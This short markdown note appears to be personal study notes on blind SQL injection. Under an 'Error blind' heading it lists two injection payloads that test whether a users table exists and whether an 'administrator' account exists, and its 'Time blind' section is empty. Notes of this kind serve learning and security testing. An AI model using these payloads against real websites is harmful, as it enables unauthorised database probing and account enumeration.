# 1. Error blind

  # 1 check table name
    - `' AND (SELECT 'a' FROM users LIMIT 1)='a`
  # 2 check particular user if exist in users table
    - `' AND (SELECT 'a' FROM users where username = 'administrator')='a`

# 2. Time blind
